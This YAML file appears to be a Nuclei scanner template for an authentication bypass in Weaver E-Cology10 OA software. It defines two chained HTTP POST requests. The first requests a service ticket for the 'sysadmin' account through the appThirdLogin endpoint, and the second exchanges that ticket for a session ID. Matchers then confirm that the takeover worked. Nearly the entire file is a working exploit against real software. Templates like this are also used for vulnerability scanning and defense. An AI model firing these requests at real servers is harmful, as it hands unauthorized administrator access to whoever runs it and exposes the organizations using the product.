id: WeaverOA-E-Cology-appThirdLogin-Authentication-bypass

info:
  name: 泛微E-Cology10 appThirdLogin 身份认证绕过漏洞
  author: WeaverOA
  severity: high
  tags: Authentication bypass
  

http:
  - raw:
      - |
        POST /papi/passport/rest/appThirdLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=sysadmin&service=1&ip=1&loginType=third
      - |
        POST /papi/passport/login/generateEteamsId HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        stTicket={{uploadfile}}

    extractors:
       - type: regex 
         part: body
         name: uploadfile
         group: 1
         regex:
            - '"serviceTicketId":"([^"]+)"'
         internal: true
  

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '接口返回成功'
          - '"data":'
        condition: and
      - type: status
        status: 
          - 200





